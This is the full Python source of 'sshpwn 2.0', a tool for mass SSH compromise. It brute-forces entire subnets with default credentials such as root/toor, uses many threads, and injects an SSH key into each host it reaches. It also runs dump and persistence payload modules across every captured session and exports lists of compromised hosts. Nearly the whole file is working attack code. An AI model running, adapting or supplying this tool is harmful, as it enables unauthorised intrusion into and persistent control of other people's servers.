#!/usr/bin/python3

release = "sshpwn 2.0"

# Copyright (c) 2016 Shawn Pang
# http://shawnpang.com
# Released under the MIT license

# TODO FOR SSHPWN 2.0
# DONE - Multi-threading with execute
# DONE - Make more modules (download (with relative ~, splits "/" takes last as downloadfile name (one param)), upload, shutdown, fun stuff...)
# DONE - Refresh targets (s = ssh(user=s.user, host=s.host), if timeout, s.close())
# DONE - Add more configurations to config file (default timeout, log level)
# DONE - Rename variables
# DONE - GUI improvements, better mode selection, greeting and time, flavour text, colors
# DONE - Whitelist feature
# DONE - Interact with a certain session
# DONE - Ability to add more sessions when in sshpwn interpreter
# DONE - Hide password with getpass

import sys, os, time, datetime, getpass, copy, threading
import misc.coloredstatus as cs
from queue import Queue
from pwn import *
from payloads.fun import *
from payloads.dump import *
from payloads.general import *
from payloads.persistence import *

def greets():
    global style1, style2
    style1 = cs.fade(232, 256, "\xBB", bold=False)
    style2 = cs.fade(232, 256, "\xAB", bold=False)

    print("\n" + style1.line(16))
    print(style2.fadein(), cs.pinkwrap(release), style2.fadeout())
    print(style1.line(16) + "\n")

    now = datetime.datetime.now()
    afternoon = now.replace(hour=12, minute=0, second=0, microsecond=0)
    evening = now.replace(hour=18, minute=0, second=0, microsecond=0)

    if now < afternoon:
        greeting = "morning"
    elif now > afternoon and now < evening:
        greeting = "afternoon"
    else:
        greeting = "evening"

    print(cs.status, "Good", greeting + ".")
    print(cs.status, "Welcome back to sshpwn.")
    print(cs.status, '{0:%d %B, %Y - %H:%M %p}'.format(now).lstrip("0").replace(" 0", " "), "\n")

    input(cs.status + " Press [enter] to initialize ")

def loadconfig():
    print(cs.status, "Loading configurations...")
    global configs
    try:
        configs = dict(config.split("#")[0].strip().split(" ") for config in open("config", "r") if config.strip() and config.split("#")[0].strip())
    except:
        print(cs.error, "Could not find config file! Exiting...")
        sys.exit(1)
    
    for key, value in configs.items():
        configs[key] = value.replace("~", os.path.expanduser("~"))
    
    # Load Individual Config Components
    global whitelist
    whitelist = []
    if configs["Whitelist"] == "on":
        print(cs.good, "Whitelist enabled...")
        whitelist = list(entry.split("#")[0].strip().split("@") for entry in open(configs["WhitelistLocation"], "r") if entry.strip() and entry.split("#")[0].strip())
    
    global log_mode
    if configs["DebugMode"] == "on":
        print(cs.good, "Debug mode enabled...")
        log_mode = "debug"
    else:
        log_mode = "error"
    
    global missioncritical
    missioncritical = False
    if configs["MissionCriticalMode"] == "on":
        print(cs.good, "Mission critical mode enabled...")
        missioncritical = True

    print(cs.good, "Loaded configurations\n")

def consolidatetargets(targets):
    if len(targets) == 0:
        print(cs.error, "Unable to connect to any user!\n")
        return 1

    total_online = 0
    for target in targets:
        total_online += 1
        print(cs.greenwrap(total_online), "Connected to", target.user, "at", target.host)
    print(cs.status, "Total connected users:", total_online)
    return 0

# SSH Threading
def getsshlist(userlist, threads=256, timeout=2, refresh=False):

    threads = int(threads)
    timeout = int(timeout)

    sshlist = []
    print_lock = threading.Lock()

    # Whitelist Filter
    if configs["Whitelist"] == "on":
        userlist = list(user for user in userlist if [user[0], user[1]] not in whitelist)

    def threader():
        while True:
            target = q.get()
            if target is None:
                break
            sshjob(user=target[0], host=target[1], password=target[2])
            q.task_done()

    def sshjob(user, host, password=None):
        try:
            context.log_level = log_mode
            conn = ssh(user=user, host=host, password=password, keyfile=configs["KeyFile"], timeout=timeout)
            sshlist.append(conn)
            if refresh == False:
                with print_lock:
                    print(cs.good, "Target found:", conn.user, "at", conn.host)
                if configs["UploadKeyOnConnect"] == "on": 
                    targets = execute(["injectkey"], [conn])
        except:
            pass

    q = Queue()
    threaders = []

    # Threading
    for workers in range(threads):
        t = threading.Thread(target=threader)
        t.start()
        threaders.append(t)

    for user in userlist:
        q.put(user)

    q.join()
    for i in range(threads):
        q.put(None)
    for t in threaders:
        t.join() 
    # Threading End

    return sshlist

def converttolist(targets):
    return list([target.user, target.host, target.password] for target in targets)

def getmissing(in_here, but_not_in_here):
    def pop_password(userlist):
        userlist_wopass = copy.deepcopy(userlist)
        for entry in userlist_wopass:
            entry.pop()
        return userlist_wopass
    return list(entry for entry in in_here if [entry[0], entry[1]] not in pop_password(but_not_in_here))

def refreshtargets(targets):

    print(cs.status, "Refreshing targets...")
    start = time.time()

    targets_list = converttolist(targets)
    refreshed_targets = getsshlist(userlist=targets_list, threads=configs["RefreshThreads"], timeout=configs["RefreshTimeout"], refresh=True)
 
    # Handle Previous Connections
    refreshed_targets_list = converttolist(refreshed_targets)
    lost_targets_list = getmissing(targets_list, refreshed_targets_list)
    total_disconnected = 0
    for target in lost_targets_list:
        total_disconnected += 1
        print(cs.error, "Disconnected from", target[0], "at", target[1])
    if len(lost_targets_list) == 0:
        print(cs.good, "No users disconnected!\n")
    else:
        print(cs.warning, "Total users disconnected:", len(lost_targets_list), "\n")
    for target in targets:
        context.log_level = log_mode
        target.close()
    targets = None

    print(cs.successlabel, "Refresh done, took " + "{:.2f}".format(time.time() - start) + " seconds\n")
    return refreshed_targets

def gettargetlist():

    print(cs.status, "s\t-\tSingle-user mode")
    print(cs.status, "m\t-\tMulti-user mode")
    print(cs.status, "b\t-\tBrute force mode")
    mode = input("\n" + cs.status + " Select a mode: ")
    targets = []
    
    if mode == 's':
        login = input(cs.status + " Enter remote user: ")
        ip = input(cs.status + " Enter remote host: ")
        password = getpass.getpass(cs.status + " Enter password (if not using key): ")

        print(cs.status, "Running single-user mode...")
        start = time.time()

        try:
            context.log_level = log_mode
            targets.append(ssh(user=login, host=ip, password=password, keyfile=configs["KeyFile"], timeout=configs["SingleUserTimeout"]))
        except:
            pass
        
        print("\n" + cs.successlabel, "Single-user mode done, took " + "{:.2f}".format(time.time() - start) + " seconds")

    elif mode == 'm':
        # Configurations
        targetlist = input(cs.status + " Enter host file to use (hosts/hosts): ")
        targetlist = "hosts/hosts" if not targetlist else targetlist
        try:
            targetlist = list(entry.split("#")[0].strip().split("@") for entry in open(targetlist, "r") if entry.strip() and entry.split("#")[0].strip())
        except FileNotFoundError:
            print(cs.error, "Could not find " + targetlist + ".\n")
            return 0

        password = getpass.getpass(cs.status + " Enter password to use (toor): ")
        password = "toor" if not password else password

        print(cs.status, "Running multi-user mode...")
        start = time.time()

        targets = list([target[0], target[1], password] for target in targetlist)
        targets = getsshlist(userlist=targets, threads=configs["MultiUserThreads"], timeout=configs["MultiUserTimeout"])

        print("\n" + cs.successlabel, "Multi-user mode done, took " + "{:.2f}".format(time.time() - start) + " seconds")

    elif mode == 'b':
        # Configurations
        login = input(cs.status + " Enter username to use (root): ")
        login = "root" if not login else login

        password = getpass.getpass(cs.status + " Enter password to use (toor): ")
        password = "toor" if not password else password
        
        subnets = input(cs.status + " Enter subnets: (192.168.1) (comma seperate multiple) (dash for range): ")
        subnets = "192.168.1" if not subnets else subnets
        subnets = list(subnet.strip() + "." for subnet in subnets.split(","))
        # Check if a range was entered
        subnetrange = len(subnets) == 1 and "-" in subnets[0]
        if subnetrange:
            octets = subnets[0].split(".")
            firstoctet = octets[0]
            secondoctet = octets[1]
            lastoctet = octets[2]
            lastoctetrange = lastoctet.split("-")
            if len(lastoctetrange) != 2:
                print(cs.error, "Invalid subnet range! Usage: 192.168.6-20")
                return None
            rangestart = int(lastoctetrange[0])
            rangeend = int(lastoctetrange[1]) + 1

        print(cs.status, "Pwning script kiddies...")
        start = time.time()

        ips = []
        
        # Class B Entire Network
        if subnets[0].count('.') == 2:
            for subnet in subnets:
                for i in range(255):
                    for k in range(255):
                        ips.append(subnet + str(i) + '.' + str(k))
        
        # Class B Network Range
        elif subnetrange:
            for i in range(rangestart, rangeend):
                for k in range(255):
                    ips.append(firstoctet + '.' + secondoctet + '.' + str(i) + '.' + str(k))
        
        # Class C Entire Network
        elif subnets[0].count('.') == 3:
            for subnet in subnets:
                for i in range(255):
                    ips.append(subnet + str(i))
        
        # Class A currently not supported, too big
        else:
            print(cs.error, "Invalid ip subnet format!")
            return None

        targets = list([login, ip, password] for ip in ips)
        targets = getsshlist(targets, threads=configs["BruteForceThreads"], timeout=configs["BruteForceTimeout"])

        print("\n" + cs.successlabel, "Brute force mode done, took " + "{:.2f}".format(time.time() - start) + " seconds")

    else:
        print(cs.error, "Unknown mode '" + mode + "'\n")
        return None

    # Consolidate targets 
    print()
    consolidateresult = consolidatetargets(targets)

    if consolidateresult == 1:
        return None
    else:
        return targets

def builtincmd(cmd, targets):
    
    if not cmd[0]:
        return 3, targets
    
    print()  # Prints a blank line after sshpwn caret

    if cmd[0] == "help":
        print("Built-In Commands:")
        print("{0:15}-\t{1:}".format("help", "Displays help for commands"))
        print("{0:15}-\t{1:}".format("back", "Returns back to mode selection"))
        print("{0:15}-\t{1:}".format("exit/quit", "Exits sshpwn"))
        print("{0:15}-\t{1:}".format("configs", "Displays loaded configurations"))
        print("{0:15}-\t{1:}".format("export", "Exports all session information to file"))
        print("{0:15}-\t{1:}".format("sessions", "Displays all connected sessions"))
        print("{0:15}-\t{1:}".format("refresh", "Reconnects with all sessions"))
        print("{0:15}-\t{1:}".format("interact", "Interacts with a session with an emulated shell"))
        print("{0:15}-\t{1:}".format("add", "Adds more sessions to the existing list"))
        
        print("\nModules Available:")
        os.system("ls -R payloads/ --hide=*.pyc --hide=__pycache__ --hide=__init__.py")
        
        return 2, targets
    
    elif cmd[0] == "back":
        print(cs.status, "Returning to mode selection...")
        # Close all current connections
        for target in targets:
            context.log_level = log_mode
            target.close()
        targets = None
        return 1, None
    
    elif cmd[0] == "exit" or cmd[0] == "quit":
        print(cs.status, "Exiting...")
        sys.exit(0)
    
    elif cmd[0] == "configs":
        for config, value in configs.items():
            print("{0:23}  -  {1:}".format(config, value))
        return 2, targets
    
    elif cmd[0] == "export":
        def usage():
            print(cs.status, "Usage: export [format: userip, iponly] [output location]")
        if len(cmd) != 2:
            usage()
            return 2, targets
        params = cmd[1].split(" ")
        if len(params) != 2:
            usage()
            return 2, targets
        elif params[0] != "userip" and params[0] != "iponly":
            print(cs.error, "Unknown format '" + params[0] + "'")
            return 2, targets

        print(cs.status, "Exporting connected users list with '" + params[0] + "' mode...")

        existingtargets = []
        try:
            existingtargets = list(entry.split("#")[0].strip() for entry in open(params[1], "r") if entry.strip() and entry.split("#")[0].strip())
        except FileNotFoundError:
            pass

        if params[0] == "userip":
            currenttargets = list(target.user + "@" + target.host for target in targets)
        elif params[0] == "iponly":
            currenttargets = list(target.host for target in targets)

        newtargets = list(entry for entry in currenttargets if entry not in existingtargets)

        output = open(params[1], 'a')
        for target in newtargets:
            output.write(target + "\n")
        output.close()

        print(cs.successlabel, len(newtargets), "new user(s) added to", params[1])
        
        return 2, targets
    
    elif cmd[0] == "interact":
        def usage():
            print(cs.status, "Usage: interact [session no.]")
        if len(cmd) != 2 or not cmd[1].isnumeric():
            usage()
            return 2, targets
        target_id = int(cmd[1]) - 1
        if missioncritical:
            try:
                tmp_session = targets[target_id]
                try:
                    context.log_level = log_mode
                    targets[target_id] = ssh(user=tmp_session.user, host=tmp_session.host, password=tmp_session.password, keyfile=configs["KeyFile"], timeout=configs["SingleUserTimeout"])
                    tmp_session.close()
                    targets[target_id].interactive()
                    return 2, targets
                except:
                    print(cs.error, "Seems like session", cmd[1], "just died...")
                    cmd[0] = "refresh"
            except IndexError:
                print(cs.error, "Session", cmd[1], "is not available, use \"sessions\" to view session numbers")
                return 2, targets
        else:
            try:
                targets[target_id].interactive()
            except IndexError:
                print(cs.error, "Session", cmd[1], "is not available, use \"sessions\" to view session numbers")
            return 2, targets

    elif cmd[0] == "sessions":
        # If Mission Critical Mode is on, interpret "sessions" command as "refresh"
        if missioncritical:
            cmd[0] = "refresh"
        else:
            exitcode = consolidatetargets(targets)
            if exitcode == 0:
                return 2, targets
            else:
                print(cs.status, "Returning to mode selection...")
                return 1, None
    
    if cmd[0] == "refresh":
        fresh_targets = refreshtargets(targets)
        
        consolidateresult = consolidatetargets(fresh_targets)

        if consolidateresult == 1:
            print(cs.status, "Returning to mode selection...")
            return 1, None
        else:
            return 2, fresh_targets

    elif cmd[0] == "add": 
        new_targets = gettargetlist()
        if not new_targets:
            return 2, targets

        print("\n" + cs.status, "Adding new users to existing list...")
        start = time.time()

        current_targets_list = converttolist(targets)        
        new_targets_list = converttolist(new_targets)
        new_targets_list_no_dupes = getmissing(new_targets_list, current_targets_list)
        
        current_targets_list.extend(new_targets_list_no_dupes)
        brand_new_targets = getsshlist(userlist=current_targets_list, threads=configs["RefreshThreads"], timeout=configs["RefreshTimeout"], refresh=True)
 
        # Handle Previous Connections
        for target in targets:
            context.log_level = log_mode
            target.close()
        targets = None
        for target in new_targets:
            context.log_level = log_mode
            target.close()
        new_targets = None

        new = 0
        for target in new_targets_list_no_dupes:
            new += 1
            print(cs.good, "Added user", target[0], "at", target[1])
        if len(new_targets_list_no_dupes) == 0:
            print(cs.status, "No new users added\n")
        else:
            print(cs.status, "Total new users added:", len(new_targets_list_no_dupes), "\n")

        print(cs.successlabel, "Done adding new users, took " + "{:.2f}".format(time.time() - start) + " seconds")

        return 2, brand_new_targets

    return 0, targets

def execute(cmd, targets):
    
    try:
        eval(cmd[0])
    except NameError:
        print(cs.error, "Payload not found!")
        return

    # Locks
    print_lock = threading.Lock()    
    
    def threader():
        while True:
            target = q.get()
            if target is None:
                break
            launch(target)
            q.task_done()

    def launch(target):
        try:
            context.log_level = log_mode
            result = eval(cmd[0] + ".execute(target, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
        except NameError:
            with print_lock:
                print(cs.error, "Payload not found!")
            return
        if result == 0:
            with print_lock:
                print(cs.successlabel, "Successfully executed", cmd[0], "on", target.user, "at" , target.host)
        elif result == 1:
            return
        else:
            with print_lock:
                print(cs.faillabel, "Failed to execute", cmd[0], "on", target.user, "at", target.host)

    # Variables
    threads = int(configs["CommandExecutionThreads"])
    q = Queue()
    threaders = []

    # Threading
    for workers in range(threads):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()
        threaders.append(t)
    
    for target in targets:
        q.put(target)

    q.join()
    for i in range(threads):
        q.put(None)
    for t in threaders:
        t.join()

    return

def main():

    try:
        greets()
        loadconfig()

        while True:
            targets = gettargetlist()
            if not targets:
                continue

            style3 = cs.center_fade(232, 256, "\xBB", 65, 0.04)
            style3.animate()

            while True:
                sshpwncmd = input(cs.sshpwncaret)
                sshpwntokens = sshpwncmd.split(" ", 1)

                builtincmdcode, targets = builtincmd(sshpwntokens, targets)
                if builtincmdcode == 1:
                    break
                elif builtincmdcode == 2:
                    print()
                    continue
                elif builtincmdcode == 3:
                    # No command typed in
                    continue

                # Refresh targets before executing command, if MissionCriticalMode is on
                if missioncritical:
                    targets = refreshtargets(targets)
                    if len(targets) == 0:
                        print(cs.error, "Unable to connect to any user!")
                        break

                execute(sshpwntokens, targets)

                print()

    except KeyboardInterrupt:
        print("\n" + cs.status, "Exiting...")
        #if configs["DebugMode"] == "on":
        #    print(cs.status, "Active thread count:", threading.activeCount())

if __name__ == "__main__":
    main()
